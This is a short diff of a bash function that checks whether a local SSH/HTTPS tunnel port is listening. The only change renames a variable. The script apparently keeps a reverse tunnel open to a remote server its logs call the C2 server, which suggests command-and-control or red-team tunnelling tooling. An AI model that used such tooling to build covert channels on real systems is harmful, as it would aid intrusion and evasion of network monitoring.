@@ -72,10 +72,10 @@ exec_sshtunnel() {
           ${USER}@localhost
   sleep 2
 
-  CHECK_STUN_CON=`netstat -plnt | grep ${HTTPSWRAPPER_PORT} | head -n1 | awk {'print $6'}`
+  CHECK_HWRAP_CON=`netstat -plnt | grep ${HTTPSWRAPPER_PORT} | head -n1 | awk {'print $6'}`
   CHECK_CON=`netstat -plnt | grep ${HTTPSWRAPPER_PORT} | head -n1 | awk {'print $6'}`
   
-  if [[ ${CHECK_STUN_CON} == "LISTEN" ]]; then
+  if [[ ${CHECK_HWRAP_CON} == "LISTEN" ]]; then
     echo "[`TIMESTAMP`] Successfully create a local SSH/HTTPS tunnel socket on port (${HTTPSWRAPPER_PORT}).." >> ${LOG_DIR}
   else
     echo "[`TIMESTAMP`] ERROR: SSH reverse tunnel failed. Unable to connect to the remote server (${C2_SERVER}).." >> ${LOG_DIR}
